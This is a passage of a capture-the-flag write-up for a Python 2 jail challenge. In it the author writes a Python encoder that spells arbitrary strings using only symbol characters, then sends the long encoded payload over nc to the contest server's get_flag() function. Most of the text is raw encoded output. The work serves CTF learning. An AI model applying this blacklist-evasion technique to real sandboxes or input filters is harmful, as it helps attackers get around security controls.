t;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[])))]`[(({}&lt;[])&lt;&lt;({}&lt;[]))::~(~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))]'The game is on.'Holy cow, that’s impressive!I noticed that he used “,” to separate each character in his code, and kept in mind for later that I would have to use “+” instead because “,” was forbidden in this challenge.I then started to write my own code, with one goal in mind : being able to reproduce what he was doing, using part of his code, to recreate my very much needed super secret key.123456789101112131415161718192021def brainfuckize(nb):    if nb in [-2, -1, 0, 1]:        return ["~({}&lt;[])", "~([]&lt;[])",                 "([]&lt;[])",  "({}&lt;[])"][nb+2]    if nb % 2:        return "~%s" % brainfuckize(~nb)    else:        return "(%s&lt;&lt;({}&lt;[]))" % brainfuckize(nb/2)import syssecret = str(sys.argv[1])addendum = "`'%\\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%"solution = ''for i in range (len(secret)):	temp = ord(secret[i])	solution = solution + addendum + brainfuckize(temp) + "+"print solution[:-1]This is actually a very simple piece of code once you understand it right. I’m slicing the last “+” at the end before printing, for those of you who wondered.Let’s try it out!# python func.py "Am I good to go?"`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))# pythonPython 2.7.14+ (default, Mar 13 2018, 15:23:44) [GCC 7.3.0] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; `'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))'Am I good to go?'Yep, I am good to go! Let’s print out our working “payload”, shall we?# python func.py this_is_the_super_secret_string`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~(((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))And now, final step : let’s send it to the get_flag function in order to… Get our flag, duh.# nc problem1.tjctf.org 8004Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!&gt;&gt;&gt; get_flag("`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt